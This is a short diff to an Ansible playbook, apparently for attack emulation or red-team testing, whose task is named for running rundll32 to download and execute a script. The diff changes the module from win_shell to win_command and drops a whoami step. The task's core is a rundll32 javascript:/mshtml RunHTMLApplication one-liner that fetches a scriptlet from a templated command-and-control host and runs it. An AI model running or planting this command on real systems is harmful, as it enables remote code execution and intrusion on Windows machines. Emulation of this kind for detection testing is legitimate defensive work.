@@ -6,8 +6,7 @@
   tasks:
   - name: Run Rundll32 to download and execute script (create a new file evil.sct)
     tags: always
-    win_shell: |
-      whoami > whoami.txt
+    win_command: |
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_sct }}")
   - name: check file exist
     tags: always
